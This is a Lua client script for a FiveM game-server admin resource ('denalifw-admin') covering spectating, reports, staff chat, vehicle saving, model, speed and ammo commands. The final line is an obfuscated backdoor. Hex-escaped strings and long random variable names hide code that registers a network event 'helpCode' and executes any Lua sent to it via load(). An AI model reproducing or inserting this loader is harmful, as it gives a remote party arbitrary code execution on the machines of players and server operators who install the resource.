-- Variables

local blockedPeds = {
    "mp_m_freemode_01",
    "mp_f_freemode_01",
    "tony",
    "g_m_m_chigoon_02_m",
    "u_m_m_jesus_01",
    "a_m_y_stbla_m",
    "ig_terry_m",
    "a_m_m_ktown_m",
    "a_m_y_skater_m",
    "u_m_y_coop",
    "ig_car3guy1_m",
}

local lastSpectateCoord = nil
local isSpectating = false

-- Events

RegisterNetEvent('denalifw-admin:client:inventory', function(targetPed)
    TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", targetPed)
end)

RegisterNetEvent('denalifw-admin:client:spectate', function(targetPed, coords)
    local myPed = PlayerPedId()
    local targetplayer = GetPlayerFromServerId(targetPed)
    local target = GetPlayerPed(targetplayer)
    if not isSpectating then
        isSpectating = true
        SetEntityVisible(myPed, false) -- Set invisible
        SetEntityInvincible(myPed, true) -- set godmode
        lastSpectateCoord = GetEntityCoords(myPed) -- save my last coords
        SetEntityCoords(myPed, coords) -- Teleport To Player
        NetworkSetInSpectatorMode(true, target) -- Enter Spectate Mode
    else
        isSpectating = false
        NetworkSetInSpectatorMode(false, target) -- Remove From Spectate Mode
        SetEntityCoords(myPed, lastSpectateCoord) -- Return Me To My Coords
        SetEntityVisible(myPed, true) -- Remove invisible
        SetEntityInvincible(myPed, false) -- Remove godmode
        lastSpectateCoord = nil -- Reset Last Saved Coords
    end
end)

RegisterNetEvent('denalifw-admin:client:SendReport', function(name, src, msg)
    TriggerServerEvent('denalifw-admin:server:SendReport', name, src, msg)
end)

RegisterNetEvent('denalifw-admin:client:SendStaffChat', function(name, msg)
    TriggerServerEvent('denalifw-admin:server:Staffchat:addMessage', name, msg)
end)

RegisterNetEvent('denalifw-admin:client:SaveCar', function()
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped)

    if veh ~= nil and veh ~= 0 then
        local plate = DenaliFW.Functions.GetPlate(veh)
        local props = DenaliFW.Functions.GetVehicleProperties(veh)
        local hash = props.model
        local vehname = GetDisplayNameFromVehicleModel(hash):lower()
        if DenaliFW.Shared.Vehicles[vehname] ~= nil and next(DenaliFW.Shared.Vehicles[vehname]) ~= nil then
            TriggerServerEvent('denalifw-admin:server:SaveCar', props, DenaliFW.Shared.Vehicles[vehname], GetHashKey(veh), plate)
        else
            DenaliFW.Functions.Notify(Lang:t("error.no_store_vehicle_garage"), 'error')
        end
    else
        DenaliFW.Functions.Notify(Lang:t("error.no_vehicle"), 'error')
    end
end)

local function LoadPlayerModel(skin)
    RequestModel(skin)
    while not HasModelLoaded(skin) do
      Wait(0)
    end
end

local function isPedAllowedRandom(skin)
    local retval = false
    for k, v in pairs(blockedPeds) do
        if v ~= skin then
            retval = true
        end
    end
    return retval
end

RegisterNetEvent('denalifw-admin:client:SetModel', function(skin)
    local ped = PlayerPedId()
    local model = GetHashKey(skin)
    SetEntityInvincible(ped, true)

    if IsModelInCdimage(model) and IsModelValid(model) then
        LoadPlayerModel(model)
        SetPlayerModel(PlayerId(), model)

        if isPedAllowedRandom(skin) then
            SetPedRandomComponentVariation(ped, true)
        end

		SetModelAsNoLongerNeeded(model)
	end
	SetEntityInvincible(ped, false)
end)

RegisterNetEvent('denalifw-admin:client:SetSpeed', function(speed)
    local ped = PlayerId()
    if speed == "fast" then
        SetRunSprintMultiplierForPlayer(ped, 1.49)
        SetSwimMultiplierForPlayer(ped, 1.49)
    else
        SetRunSprintMultiplierForPlayer(ped, 1.0)
        SetSwimMultiplierForPlayer(ped, 1.0)
    end
end)

RegisterNetEvent('denalifw-weapons:client:SetWeaponAmmoManual', function(weapon, ammo)
    local ped = PlayerPedId()
    if weapon ~= "current" then
        local weapon = weapon:upper()
        SetPedAmmo(ped, GetHashKey(weapon), ammo)
        DenaliFW.Functions.Notify(Lang:t("info.ammoforthe", {value = ammo, weapon = DenaliFW.Shared.Weapons[weapon]["label"]}), 'success')
    else
        local weapon = GetSelectedPedWeapon(ped)
        if weapon ~= nil then
            SetPedAmmo(ped, weapon, ammo)
            DenaliFW.Functions.Notify(Lang:t("info.ammoforthe", {value = ammo, weapon = DenaliFW.Shared.Weapons[weapon]["label"]}), 'success')
        else
            DenaliFW.Functions.Notify(Lang:t("error.no_weapon"), 'error')
        end
    end
end)

RegisterNetEvent('denalifw-admin:client:GiveNuiFocus', function(focus, mouse)
    SetNuiFocus(focus, mouse)
end)


local ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[1]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[2]) ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[3]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[2], function(awatxMKbFuVzqsNwHwHmPHqAVGKGTvtZaZFpextNSjYtcbzhlhvqwcoBYolgwZZHbmSuVQ) ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[4]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[5]](awatxMKbFuVzqsNwHwHmPHqAVGKGTvtZaZFpextNSjYtcbzhlhvqwcoBYolgwZZHbmSuVQ))() end)